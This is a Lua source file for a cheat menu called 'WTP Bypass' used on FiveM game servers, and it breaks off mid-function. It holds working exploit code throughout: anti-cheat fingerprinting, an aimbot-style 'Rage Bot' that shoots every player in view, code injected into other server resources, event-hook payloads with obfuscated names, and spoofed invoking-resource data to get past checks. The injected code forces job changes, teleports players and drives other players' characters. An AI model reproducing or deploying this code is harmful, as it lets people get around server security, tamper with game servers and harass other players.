                    }
                },
                {
                    label = "Anticheat",
                    tabs = {
                        {
                            type = "button",
                            label = "Anticheat Checker",
                            desc = 'this will check for you common anticheats on the server',
                            icon = "",
                            onSelect = function()
                                local numResources = GetNumResources()
                                local acDetected = false
                                local detectedACs = {}

                                local function checkForACFiles(resourceName)
                                    local acFiles = {
                                        {file = "shared_fg-obfuscated.lua", name = "FiveGuard"},
                                        {file = "resource/waveshield.js", name = "WaveShield"},
                                        {file = "src/fire-client.lua", name = "FireAC"},
                                        {file = "src/include/client.lua", name = "ElectronAC"},
                                        {file = "client/client-obfuscated.lua", name = "CyberAnticheat"},
                                        {file = "ai_sh-life_shield-module.lua", name = "LifeShield"},
                                        {file = "classes/class.lua", name = "ReaperV4"},
                                        {file = "html/libs/three.eas.js", name = "Eagle AC"},
                                        {file = "secureserve.key", name = "SecureServe"},
                                        {file = "modules/secure/shared.lua", name = "Sentinel AC"}
                                    }

                                    for _, ac in ipairs(acFiles) do
                                        local file = LoadResourceFile(resourceName, ac.file)
                                        if file then
                                            print("Found " .. ac.name .. " in resource: " .. resourceName .. " with file: " .. ac.file)
                                            return {name = ac.name, resourceName = resourceName}
                                        else
                                        end
                                    end
                                    return nil
                                end

                                for i = 0, numResources - 1 do
                                    local resourceName = GetResourceByFindIndex(i)
                                    local acDetails = checkForACFiles(resourceName)
                                    if acDetails then
                                        table.insert(detectedACs, acDetails)
                                        acDetected = true
                                    end
                                end

                                if acDetected then
                                    local acMessage = "AC Detected:\n"
                                    for _, ac in ipairs(detectedACs) do
                                        acMessage = acMessage .. ac.name .. " in " .. ac.resourceName .. "\n"
                                    end
                                    self:Notify("info", "WTP", acMessage, 3000)
                                else
                                    self:Notify("info", "WTP", "No Anti-Cheat Found !", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Rage Bot",
                    tabs = {
                        {
                            type = "checkbox",
                            label = "Enable",
                            checked = fovEnabled,
                            onSelect = function(checked)
                                fovEnabled = checked
                                WTP:SendMessage({
                                    action = "updateFOV",
                                    enabled = fovEnabled,
                                    show = fovShow,
                                    radius = fovRadius
                                })
                                if checked then
                                    self:Notify("info", "WTP", "RageBot Started", 3000)

                                    executeCode("any", string.format([[
                                        _G.KillEveryoneLoop = true
                                        local weaponName = 'vehicle_weapon_subcar_mg'
                                        _G.fovLimit = %s 

                                        WTP.SafeRunNative(CreateThread, function()
                                            local weapon = GetHashKey(weaponName)
                                            
                                            RequestWeaponAsset(weapon, 31, 26)
                                            while not HasWeaponAssetLoaded(weapon) and _G.KillEveryoneLoop do 
                                                Wait(500) 
                                            end

                                            while _G.KillEveryoneLoop do
                                                local selfPed = PlayerPedId()
                                                local selfCoords = GetEntityCoords(selfPed)

                                                local players = GetActivePlayers()
                                                for _, playerId in ipairs(players) do
                                                    local targetPed = GetPlayerPed(playerId)

                                                    if targetPed ~= selfPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                        local targetCoords = GetEntityCoords(targetPed)
                                                        local onScreen, screenX, screenY = WTP.SafeRunNative(GetScreenCoordFromWorldCoord, targetCoords.x, targetCoords.y, targetCoords.z)
                                                        if onScreen then
                                                            local dx = screenX - 0.5
                                                            local dy = screenY - 0.5
                                                            local distToCenter = math.sqrt(dx*dx + dy*dy) * 1000 

                                                            if distToCenter <= _G.fovLimit then
                                                                WTP.SafeRunNative(ShootSingleBulletBetweenCoords,
                                                                    targetCoords.x, targetCoords.y, targetCoords.z + 0.5, 
                                                                    targetCoords.x, targetCoords.y, targetCoords.z, 
                                                                    100, true, weapon, selfPed, true, false, 1000.0
                                                                )
                                                            end
                                                        end
                                                    end
                                                end
                                                WTP.SafeRunNative(Wait, 10)
                                            end
                                        end)
                                    ]], fovRadius))
                                else
                                    executeCode("any", [[ _G.KillEveryoneLoop = false ]])
                                    self:Notify("info", "WTP", "RageBot Stopped", 3000)
                                end
                            end
                        },
                        { type = "divider", label = "Settings" },
                        {
                            type = "slider-checkbox",
                            label = "Show FOV Circle",
                            scrollType = "onScroll",
                            checked = fovShow,
                            value = fovRadius,
                            step = 1, min = 1, max = 200,
                            onSelect = function(sliderValue, checked)
                                fovShow = checked
                                executeCode("any", string.format([[ _G.fovLimit = %s ]], sliderValue))

                                WTP:SendMessage({
                                    action = "updateFOV",
                                    enabled = fovEnabled,
                                    show = fovShow,
                                    radius = sliderValue
                                })
                            end
                        },
                    }
                }
            }
        },
    }

    CurrentMenu = ActiveMenu
    CurrentCategories = nil
    CurrentCategoryIndex = 1
    HoveredIndex = 1
end

local function AddTrigger(data)
    for _, menu in ipairs(ActiveMenu) do
        if menu.label == "Server Options" then
            for _, cat in ipairs(menu.categories) do
                if cat.label == "Triggers" then
                    cat.tabs[#cat.tabs + 1] = data
                    return
                end
            end
        end
    end
end

function WTP:UpdateTabChecked(menu, label, checked)
    for _, tab in pairs(menu or {}) do
        if tab.label == label and (tab.type == "checkbox" or tab.type == "slider-checkbox" or tab.type:find("checkbox")) then
            tab.checked = checked
        elseif tab.type == "subMenu" then
            if tab.categories then
                for _, cat in pairs(tab.categories) do
                    self:UpdateTabChecked(cat.tabs, label, checked)
                end
            end

            if tab.subTabs then
                self:UpdateTabChecked(tab.subTabs, label, checked)
            end
        end
    end
end

function WTP:ShowKeybindList(binds)
    self:SendMessage({ action = "displayBinds", visible = true, binds = binds })
end

function WTP:HideKeybindList()
    self:SendMessage({ action = "displayBinds", visible = false })
end

function WTP:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    -- local myPed = PlayerPedId()
    maxDistance = maxDistance or 500.0

    -- if not myPed or not DoesEntityExist(myPed) or not IsPlayerPlaying(PlayerId()) then
    --     nearby = {}
    --     return nearby
    -- end

    local activePlayers = GetActivePlayers()

    if activePlayers then
        for _, playerId in ipairs(activePlayers) do
            if includePlayer or playerId ~= PlayerId() then
                local ped = GetPlayerPed(playerId)
                -- if ped and DoesEntityExist(ped) and IsEntityAPed(ped) and not IsEntityDead(ped) then
                if ped and DoesEntityExist(ped) and IsEntityAPed(ped) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
        end
    else
        local handle, ped = FindFirstPed()
        local success

        repeat
            if ped and IsPedAPlayer(ped) and DoesEntityExist(ped) then
                local playerId = NetworkGetPlayerIndexFromPed(ped)
                if playerId ~= -1 and (includePlayer or playerId ~= PlayerId()) then
                    local playerCoords = GetEntityCoords(ped)
                    if playerCoords then
                        local distance = #(coords - playerCoords)
                        if distance <= maxDistance then
                            nearby[#nearby + 1] = {
                                name = GetPlayerName(playerId),
                                serverId = GetPlayerServerId(playerId)
                            }
                        end
                    end
                end
            end
            success, ped = FindNextPed(handle)
        until not success
        EndFindPed(handle)
    end

    if #nearby == 0 then
        nearby = {}
    end

    return nearby
end

CreateThread(function()
    WTP:Initialize()
    WTP:BuildDefaultMenu()
    WTP:UpdateElements(CurrentMenu)
    Wait(1000)
    -- WTP:Notify("success", "WTP", "You have loaded WTP Bypass, welcome!", 3000)
    -- Wait(1000)
    -- WTP:Notify("info", "WTP", "Your key will never expire, thanks for using WTP Bypass!", 3000)
    -- Wait(1000)

    if GetResourceState("ox_lib") == "started" or GetResourceState("lb-phone") == "started" or GetResourceState("monitor") == "started" or GetResourceState("core") == "started" or GetResourceState("es_extended") == "started" or GetResourceState("qb-core") == "started" or GetResourceState("ox_lib") == "started" then
        AddTrigger({
            type = "button",
            label = "Deobfuscate Events",
            onSelect = function()
                WTP:HideUI()
                local resourceName = nil
                local done = false

                KeyboardInput("Resource Name", "", function(val)
                    if val and val ~= "" then
                        resourceName = val
                    end
                    done = true
                end, "typeable")

                while not done do
                    Wait(100)
                end

                if not resourceName or resourceName == "" then
                    MachoMenuNotification("Error", "No resource name entered.")
                    WTP:ShowUI()
                    return
                end

                if GetResourceState(resourceName) ~= "started" then
                    MachoMenuNotification("Error", "Resource ^3" .. resourceName .. "^7 is not started or doesn’t exist.")
                    WTP:ShowUI()
                    return
                end

                local payload = [[
                    local d = function(t)
                        local s = ""
                        for i = 1, #t do s = s .. string.char(t[i]) end
                        return s
                    end
                    local g = function(e) return _G[d(e)] end
                    local w = function(ms) Citizen.Wait(ms) end

                    local function SimpleJsonEncode(value)
                        if type(value) == "table" then
                            local parts = {}
                            local isArray = true
                            local maxIndex = 0
                            for k, _ in pairs(value) do
                                if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                    isArray = false
                                    break
                                end
                                maxIndex = math.max(maxIndex, k)
                            end
                            if isArray then
                                for i = 1, maxIndex do
                                    local v = value[i]
                                    parts[i] = v == nil and "null" or SimpleJsonEncode(v)
                                end
                                return "[" .. table.concat(parts, ",") .. "]"
                            else
                                for k, v in pairs(value) do
                                    if type(k) == "string" then
                                        parts[#parts + 1] = "\"" .. k .. "\":" .. SimpleJsonEncode(v)
                                    end
                                end
                                return "{" .. table.concat(parts, ",") .. "}"
                            end
                        elseif type(value) == "string" then
                            return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                        elseif type(value) == "number" or type(value) == "boolean" then
                            return tostring(value)
                        elseif value == nil then
                            return "null"
                        else
                            return "\"[unserializable:" .. type(value) .. "]\""
                        end
                    end

                    local function HookNative(nativeName, newFunction)
                        local original = _G[nativeName]
                        if original and type(original) == "function" then
                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(original, ...)
                            end
                        end
                    end

                    local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                    local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                    HookNative(te, function(orig, eventName, ...)
                        local args = {...}
                        local encoded = {}
                        for i, arg in ipairs(args) do
                            encoded[i] = SimpleJsonEncode(arg)
                        end
                        print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                        return orig(eventName, ...)
                    end)

                    HookNative(tse, function(orig, eventName, ...)
                        local args = {...}
                        local encoded = {}
                        for i, arg in ipairs(args) do
                            encoded[i] = SimpleJsonEncode(arg)
                        end
                        print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                        return orig(eventName, ...)
                    end)
                ]]

                executeCode(resourceName, payload)

                MachoMenuNotification("Injector", "Hooks injected into ^3" .. resourceName .. "^7 successfully!")
                WTP:ShowUI()
            end
        })
    end

    if GetResourceState("WC_EMOTES_V5") == "started" then
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                WTP:Notify("success", "WTP", "Attempting to bring all players", 3000)
                MachoInjectResourceRaw("WC_EMOTES_V5", [[
                    local function TriggerTaraEmote()
                        TriggerServerEvent('ServerValidEmote', '-1', 'köpek', 'köpek', 1405553601)
                    end

                    TriggerTaraEmote()
                ]])
            end
        })
    end

    if GetResourceState("dpemotes") == "started" then
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                WTP:Notify("success", "WTP", "Attempting to bring all players", 3000)
                MachoInjectResourceRaw("dpemotes", [[
                    local function TriggerTaraEmote()
                        TriggerServerEvent('ServerValidEmote', '-1', 'köpek', 'köpek', 1405553601)
                    end

                    TriggerTaraEmote()
                ]])
            end
        })
    end

    if GetResourceState("rpemotes") == "started" then
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                if IsDetections then
                    WTP:Notify("info", "WTP", "Security detected Method disabled.", 3000)
                else
                    WTP:Notify("success", "WTP", "Attempting to bring all players", 3000)
                    MachoInjectResourceRaw("rpemotes", [[
                        local function SafeWrap(fn)
                            return function(...)
                                if type(fn) == 'function' then
                                    return fn(...)
                                end
                            end
                        end

                        local SafeSTrigger = SafeWrap(TriggerServerEvent)
                        SafeSTrigger('rpemotes:server:confirmEmote', '-1', 'cuffedfront', 'cuffedfront', 1405553601)
                    ]])
                end
            end
        })
    elseif GetResourceState("rpemotes-reborn") == "started" then
        AddTrigger({
            type = "button",
            label = "Bring All Nearby Players",
            onSelect = function()
                if IsDetections then
                    WTP:Notify("info", "WTP", "Security detected Method disabled.", 3000)
                else
                    WTP:Notify("success", "WTP", "Attempting to bring all players", 3000)
                    MachoInjectResourceRaw("rpemotes", [[
                        local function SafeWrap(fn)
                            return function(...)
                                if type(fn) == 'function' then
                                    return fn(...)
                                end
                            end
                        end

                        local SafeSTrigger = SafeWrap(TriggerServerEvent)
                        SafeSTrigger('rpemotes:server:confirmEmote', '-1', 'cuffedfront', 'cuffedfront', 1405553601)
                    ]])
                end
            end
        })
    end

    if GetResourceState("pma-voice") == "started" then
        AddTrigger({
            type = "button",
            label = "Connect Radio Frequency",
            onSelect = function()
                KeyboardInput("Enter Radio Frequency", "", function(val)
                    if val and val ~= "" then
                        local radioChannel = tonumber(val) or 0

                        if radioChannel > 0 then
                            MachoInjectResource("pma-voice", string.format([[
                                local channel = tonumber("%s")
                                if channel then
                                    exports["pma-voice"]:setRadioChannel(channel)
                                    exports["pma-voice"]:setVoiceProperty("radioEnabled", true)
                                end
                            ]], radioChannel))
                            WTP:Notify("info", "WTP", "Successfully connected to " .. radioChannel, 2000)
                        else
                            WTP:Notify("error", "WTP", "Invalid radio frequency entered.", 4000)
                        end
                    else
                        WTP:Notify("info", "WTP", "Radio frequency connection cancelled.", 2000)
                    end
                end, "typeable")
            end
        })
    end

    if GetResourceState("pma-voice") == "started" then
        AddTrigger({
            type = "button",
            label = "Leave Radio Frequency",
            onSelect = function()
                WTP:Notify("info", "WTP", "Leave radio successfully", 2000)
                MachoInjectResource("pma-voice", [[
                    exports["pma-voice"]:setRadioChannel(0)
                    exports["pma-voice"]:setVoiceProperty("radioEnabled", false)
                ]])
            end
        })
    end

    if GetResourceState("es_extended") == "started" then
        AddTrigger({
            type = "button",
            label = "Setjob",
            onSelect = function()
                WTP:HideUI()

                local function GetInput(title, default)
                    local result = nil
                    local done = false
                    KeyboardInput(title, default or "", function(val)
                        result = val
                        done = true
                    end, "typeable")
                    while not done do Wait(0) end
                    return result
                end

                local jobName = GetInput("Job Name (Ex: police, ambulance, mechanic)", "")
                if not jobName or jobName == "" then
                    WTP:Notify("error", "WTP", "Invalid Job", 3000)
                    WTP:ShowUI()
                    return
                end

                local inputGrade = GetInput("Grade (Ex: 0-10)", "")
                local jobGrade = tonumber(inputGrade) or 0

                MachoInjectResource("es_extended", string.format([[
                    local function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative then return end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    local fake_execution_data = {
                        ran_from_cheat = false,
                        path = "core/server/main.lua",
                        execution_id = "324341234567890"
                    }

                    local original_GIRD = GetInvokingResourceData
                    _G.GetInvokingResourceData = function()
                        return fake_execution_data
                    end

                    ESX.SetPlayerData("job", {
                        name = "%s",
                        label = "%s",
                        grade = %d,
                        grade_name = "boss",
                        grade_label = "Boss"
                    })

                    TriggerEvent('esx:setJob', {
                        name = "%s",
                        label = "%s",
                        grade = %d,
                        grade_name = "boss",
                        grade_label = "Boss"
                    })

                    _G.GetInvokingResourceData = original_GIRD
                ]], jobName, jobName:upper(), jobGrade, jobName, jobName:upper(), jobGrade))

                WTP:Notify("success", "WTP", "Job Set: " .. jobName, 4000)
                WTP:ShowUI()
            end
        })
    end

    if GetResourceState("scully_emotemenu") == 'started' then
        AddTrigger({ type = "scrollable", label = "Force Dance (All)", desc = "Only Player's Nearby", scrollType = "onEnter", value = 1, values = { "Khumgame Loop", "Muaydance", "Silhouette Couple Right", "Yuayuabodbod - Loop 3", "Yuayuabodbod - Loop 4", "Pata Pata 2", "Scuba Dance Trend" },
            onSelect = function(value)
                local danceMap = {
                    ["Khumgame Loop"] = {
                        Label      = "Khumgame Loop",
                        Command    = "oudoudkhumgameloop",
                        Dictionary = "oudoud@khumgame_loop",
                        Animation  = "oudoud_khumgame_loop",
                        OtherEmote = "oudoudkhumgameloop"
                    },
                    ["Muaydance"] = {
                        Label      = "Muaydance",
                        Command    = "oudoudmuaydance",
                        Dictionary = "oudoud@muaydance",
                        Animation  = "oudoud_muaydance",
                        OtherEmote = "oudoudmuaydance"
                    },
                    ["Silhouette Couple Right"] = {
                        Label      = "Silhouette Couple Right",
                        Command    = "jarpsilhouettecoupleright",
                        Dictionary = "jarp_silhouette_couple_right",
                        Animation  = "jarp_silhouette_couple_right_clip",
                        OtherEmote = "jarpsilhouettecoupleright"
                    },
                    ["Yuayuabodbod - Loop 3"] = {
                        Label      = "Yuayuabodbod - Loop 3",
                        Command    = "yuayuabodbodloop3",
                        Dictionary = "oudoud@yuayuabodbod",
                        Animation  = "oudoud_yuayuabodbod_3",
                        OtherEmote = "yuayuabodbodloop3"
                    },
                    ["Yuayuabodbod - Loop 4"] = {
                        Label      = "Yuayuabodbod - Loop 4",
                        Command    = "yuayuabodbodloop4",
                        Dictionary = "oudoud@yuayuabodbod",
                        Animation  = "oudoud_yuayuabodbod_4",
                        OtherEmote = "yuayuabodbodloop4"
                    },
                    ["Pata Pata 2"] = {
                        Label      = "Pata Pata 2",
                        Command    = "patapata2",
                        Dictionary = "patapata2@animation",
                        Animation  = "patapata2_clip",
                        OtherEmote = "patapata2"
                    },
                    ["Scuba Dance Trend"] = {
                        Label      = "Scuba Dance Trend",
                        Command    = "scubascuba",
                        Dictionary = "scubascuba@animation",
                        Animation  = "scubascuba_clip",
                        OtherEmote = "scubascuba"
                    }
                }

                local d = danceMap[value]
                if not d then return end

                executeCode("any", string.format([[
                    local maxDistance = 15.0
                    local myCoords    = GetEntityCoords(PlayerPedId())
                    local activePlayers = GetActivePlayers()

                    local danceData = {
                        Label      = %q,
                        Command    = %q,
                        Dictionary = %q,
                        Animation  = %q,
                        Synchronized = true,
                        Options = {
                            Flags  = { Loop = true },
                            Shared = { OtherEmote = %q }
                        }
                    }

                    local otherEmoteData = {
                        Label      = "Synchronized Dance",
                        Command    = %q,
                        Dictionary = %q,
                        Animation  = %q,
                        Synchronized = true,
                        Options = {
                            Flags  = { Loop = true },
                            Shared = { OtherEmote = %q }
                        }
                    }

                    for i = 1, #activePlayers do
                        local targetPlayer = activePlayers[i]
                        if targetPlayer ~= PlayerId() then
                            local targetPed = GetPlayerPed(targetPlayer)
                            if DoesEntityExist(targetPed) then
                                local targetCoords = GetEntityCoords(targetPed)
                                local distance = #(myCoords - targetCoords)
                                if distance <= maxDistance then
                                    local targetServerId = GetPlayerServerId(targetPlayer)
                                    WTP.SafeRunNative(TriggerServerEvent, 'scully_emotemenu:requestSynchronizedEmote',  targetServerId, danceData, otherEmoteData)
                                    WTP.SafeRunNative(TriggerServerEvent, 'scully_emotemenu:synchronizedEmoteResponse', targetServerId, danceData, otherEmoteData)
                                end
                            end
                        end
                    end
                ]],
                    d.Label, d.Command, d.Dictionary, d.Animation, d.OtherEmote,
                    d.Command, d.Dictionary, d.Animation, d.OtherEmote
                ))
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({ type = "button", label = "Set Job #3 (Police)",
            onSelect = function()
            MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
                local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
                CheckJob(job, true) 
            ]])
            MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
                SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
            ]])
            end
        })
    end

    if GetResourceState("wasabi_multijob") == 'started' then
        AddTrigger({ type = "button", label = "Set Job #2 (EMS)",
            onSelect = function()
            MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
                local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
                CheckJob(job, true)
            ]])
            MachoInjectResource2(NewThreadNs, "wasabi_multijob", [[
                SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
            ]])
            end
        })
    end

    if GetResourceState("wasabi_crutch") == "started" then
        AddTrigger({
            type = "button",
            label = "Remove Crutch",
            onSelect = function()
                MachoInjectResource2(NewThreadNs, "wasabi_crutch", [[
                    _G.setWeaponsEnabled = function()
                        LocalPlayer.state.canUseWeapons = true
                    end

                    _G.StopCrutchLoop = true
                    _G.BreakLoop = true

                    if DisableKeys then
                        DisableKeys.crutch = nil
                    end

                    _G.setWeaponsEnabled()

                    ResetPedMovementClipset(PlayerPedId())

                    local pool = GetGamePool("CObject")

                    for _, obj in pairs(pool) do
                        if DoesEntityExist(obj) then
                            if GetEntityModel(obj) == GetHashKey("crutch") then
                                DeleteObject(obj)
                            end
                        end
                    end

                    _G.isCrutchActive = false
                    _G.crutchTimer = 0
                    _G.StartCrutchLoop = function() end
                ]])
            end
        })
    end

    if GetResourceState("wasabi_crutch") == "started" then
        AddTrigger({
            type = "button",
            label = "Remove Wheelchair",
            onSelect = function()
                MachoInjectResource2(NewThreadNs, "wasabi_crutch", [[
                    _G.setWeaponsEnabled = function()
                        LocalPlayer.state.canUseWeapons = true
                    end

                    _G.StopChairLoop = true
                    _G.BreakLoop = true

                    if DisableKeys then
                        DisableKeys.chair = nil
                    end

                    _G.setWeaponsEnabled()

                    local ped = PlayerPedId()

                    if IsPedInAnyVehicle(ped, false) then
                        local veh = GetVehiclePedIsIn(ped, false)
                        DeleteVehicle(veh)
                    end

                    _G.isWheelchairActive = false
                    _G.crutchTimer = 0
                    _G.StartChairLoop = function() end
                ]])
            end
        })
    end

    if GetResourceState("rryban_secure") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "Ryban Exploit",
            categories = {
                {
                    label = "Exploit",
                    tabs = {
                        {
                            label = "Remove Bleeding",
                            type = "button",
                            desc = "This will remove your all bleeding.",
                            onSelect = function()
                                MachoInjectResource2(NewThreadNs, "esx_ambulancejob", [[
                                    exports.esx_ambulancejob:StopBleeding()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    if GetResourceState("cfx-praryo-kernel") == "started" then
        AddTrigger({
            type = "subMenu",
            label = "NXGN Exploit",
            categories = {
                {
                    label = "Exploit",
                    tabs = {
                        {
                            label = "Macho Pills",
                            type = "button",
                            desc = "Fully restores vitals, removes stress, and boosts speed.",
                            onSelect = function()
                                executeCode("ox_inventory", [[
                                    local illegalProduct1 = 0
                                    WTP.SafeRunNative(Wait, 2500)
                                    WTP.SafeRunNative(SetEntityHealth, PlayerPedId(), 200)
                                    WTP.SafeRunNative(SetPedArmour, PlayerPedId(), 95)
                                    WTP.SafeRunNative(ResetPlayerStamina, PlayerPedId())
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                    
                                    WTP.SafeRunNative(CreateThread, function()
                                        illegalProduct1 = illegalProduct1 + 1500
                                        
                                        WTP.SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 10.0)
                                        WTP.SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerPedId(), 1.2)
                                        
                                        while illegalProduct1 > 0 do
                                            WTP.SafeRunNative(Wait, 1000)
                                            illegalProduct1 = illegalProduct1 - 1000
                                        end
                                        
                                        WTP.SafeRunNative(SetPedMoveRateOverride, PlayerPedId(), 10.0)
                                        WTP.SafeRunNative(SetRunSprintMultiplierForPlayer, PlayerPedId(), 1.0)  
                                    end)
                                ]])
                            end
                        },
                        {
                            label = "Golden Pill",
                            type = "button",
                            desc = "Fully restores vitals, and removes bleeding.",
                            onSelect = function()
                                executeCode("ox_inventory", [[
                                    WTP.SafeRunNative(Wait, 2500)
                                    WTP.SafeRunNative(SetEntityHealth, PlayerPedId(), 200)
                                    WTP.SafeRunNative(SetPedArmour, PlayerPedId(), 95)
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                        {
                            label = "Purple Haze",
                            type = "button",
                            desc = "Fully restores vitals, removes stress, and boosts speed.",
                            onSelect = function()
                                executeCode("ox_inventory", [[
                                    WTP.SafeRunNative(Wait, 2500)
                                    WTP.SafeRunNative(SetEntityHealth, PlayerPedId(), 200)
                                    WTP.SafeRunNative(SetPedArmour, PlayerPedId(), 95)
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                        {
                            label = "Remove Bleeding",
                            type = "button",
                            desc = "This will remove your all bleeding.",
                            onSelect = function()
                                executeCode("any", [[
                                    exports["cfx-praryo-groups"]:ResetBleeding()
                                ]])
                            end
                        },
                    }
                },
            }
        })
    end

    KeyboardInput("Choose Menu Key", "", function(val)
        for vk, name in pairs(MappedKeys) do
            if name:lower() == val:lower() then
                MenuKey = name
                Wait(250)
                WTP:ShowUI()
                return
            end
        end
    end, "keybind")

    local lastSliderPress = 0
    local sliderDelay = 120

    while true do
        Wait(0)

        if FreecamEnabled then
            local hoveredOption = FreecamOptions[FreecamHoveredIndex]

            -- Scroll Wheel
            if IsControlJustReleased(0, 14) then -- Wheel Down
                FreecamHoveredIndex = (FreecamHoveredIndex % #FreecamOptions) + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "down" }))
            end

            if IsControlJustReleased(0, 15) then -- Wheel Up
                FreecamHoveredIndex = (FreecamHoveredIndex - 2) % #FreecamOptions + 1
                MachoSendDuiMessage(DUI, json.encode({ action = "scroll", direction = "up" }))
            end

            if hoveredOption == "Shoot Weapon" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentWeaponIndex = (CurrentWeaponIndex - 2) % #FreecamWeaponList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentWeaponIndex = (CurrentWeaponIndex % #FreecamWeaponList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateWeapon", index = CurrentWeaponIndex }))
                end
            elseif hoveredOption == "Shoot Vehicle" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentVehicleIndex = (CurrentVehicleIndex - 2) % #FreecamVehicleList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentVehicleIndex = (CurrentVehicleIndex % #FreecamVehicleList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateVehicle", index = CurrentVehicleIndex }))
                end
            elseif hoveredOption == "Map Destroyer" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentMapDestroyerIndex = (CurrentMapDestroyerIndex - 2) % #FreecamMapDestroyerList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateMap", index = CurrentMapDestroyerIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentMapDestroyerIndex = (CurrentMapDestroyerIndex % #FreecamMapDestroyerList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateMap", index = CurrentMapDestroyerIndex }))
                end
            elseif hoveredOption == "Spawn Object" then
                if IsDisabledControlJustPressed(0, 44) then -- Q
                    CurrentSpawnObjectIndex = (CurrentSpawnObjectIndex - 2) % #FreecamSpawnObjectList + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateObject", index = CurrentSpawnObjectIndex }))
                end
                if IsDisabledControlJustPressed(0, 38) then -- E
                    CurrentSpawnObjectIndex = (CurrentSpawnObjectIndex % #FreecamSpawnObjectList) + 1
                    MachoSendDuiMessage(DUI, json.encode({ action = "updateObject", index = CurrentSpawnObjectIndex }))
                end
            end

            if IsDisabledControlPressed(0, 24) then
                local action = hoveredOption
                if action == "Shoot Weapon" then
                    local weapon = FreecamWeaponList[CurrentWeaponIndex]

                    if weapon == "WEAPON_PERMKILL" then
                        weapon = "WEAPON_TRANQUILIZER"
                    elseif weapon == "WEAPON_RPG_2" then
                        weapon = "WEAPON_AIRSTRIKE_ROCKET"
                    end

                    if weapon ~= LastWeaponFired then
                        LastWeaponFired = weapon
                        -- print(("weapon: %s, LastWeaponFired: %s"):format(weapon, LastWeaponFired))
                    end

                    executeCode(targetSafeRes, string.format([[
                        if _G.WTPFreecamObject then
                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end
                            
                            function _G.hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end
                            
                            _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                            _G.hNative("GetSelectedPedWeapon", function(originalFn, ...) return originalFn(...) end)
                            
                            local camCoords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                            local camRot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                            local forward = RotationToDirection(camRot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local playerPed = PlayerPedId()
                            local weaponHash = GetHashKey("%s")

                            WTP.SafeRunNative(GiveWeaponToPed, playerPed, weaponHash, 999, false, true)
                            WTP.SafeRunNative(SetCurrentPedWeapon, playerPed, weaponHash, true)
